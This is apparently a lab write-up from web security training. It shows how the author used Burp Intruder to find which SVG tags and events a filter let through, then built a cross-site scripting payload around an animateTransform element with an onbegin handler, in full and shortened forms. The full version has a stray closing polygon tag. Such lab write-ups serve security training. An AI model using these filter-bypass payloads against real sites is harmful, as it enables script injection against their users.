I started by using Burp Intruder in order to find the accepted events.  
I took the events form here: https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/Events

And it looks like the only accepted event is `onbegin`

I then looked here: https://developer.mozilla.org/en-US/docs/Web/SVG/Attribute/begin  
and saw that the only accepted tags are `<animateTransform>` and `<discard>`,  
so I think I need to pair them with a `<circle>` or something like that.

Then I went here: https://developer.mozilla.org/en-US/docs/Web/SVG/Element/animateTransform

And copied the transforming polygon code, only to see that `<polygon>` is blocked.  
So I replaced it with a `<circle>`, and solved the lab:

```html
<svg width="120" height="120" viewBox="0 0 120 120"
     xmlns="http://www.w3.org/2000/svg">

    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
        <animateTransform 
        onbegin="alert();"
        attributeName="transform"
                          attributeType="XML"
                          type="rotate"
                          from="0 60 70"
                          to="360 60 70"
                          dur="10s"
                          repeatCount="indefinite"/>
    </polygon>
</svg>
```

I then removed the irrelevant stuff to create a shorter, focused version:

```html
<svg><animateTransform onbegin="alert();">
```